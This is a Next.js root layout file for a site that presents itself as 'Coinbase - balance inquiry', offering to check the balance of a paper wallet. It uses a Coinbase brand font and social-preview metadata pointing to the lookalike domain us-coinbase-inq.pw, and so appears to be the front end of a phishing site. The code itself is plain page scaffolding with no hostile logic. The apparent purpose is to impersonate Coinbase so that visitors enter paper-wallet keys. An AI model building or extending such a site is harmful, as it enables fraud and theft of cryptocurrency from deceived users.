import type { Metadata } from "next";
import localFont from "next/font/local";
import "./globals.css";
import Head from "next/head";

const geistSans = localFont({
  src: "./fonts/Coinbase_Display-Regular-web-1.32.woff2",
  variable: "--font-geist-sans",
});
const geistMono = localFont({
  src: "./fonts/GeistMonoVF.woff",
  variable: "--font-geist-mono",
  weight: "100 900",
});

export const metadata: Metadata = {
  title: "Coinbase - balance inquiry",
  description: "Check the balance of your paper-wallet.",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">

      <Head>
        <title>Coinbase - balance inquiry</title>
        <meta property="og:title" content="Coinbase - balance inquiry" />
        <meta property="og:description" content="Check the balance of your paper-wallet." />
        <meta property="og:image" content="https://us-coinbase-inq.pw/og-cb-paper-wallet.gif" />
        <meta property="og:url" content="https://us-coinbase-inq.pw" />
        <meta property="og:type" content="website" />

        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="Coinbase - balance inquiry" />
        <meta name="twitter:description" content="Check the balance of your paper-wallet." />
        <meta name="twitter:image" content="https://us-coinbase-inq.pw/og-cb-paper-wallet.gif" />
      </Head>
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
      >
        {children}
      </body>
    </html>
  );
}
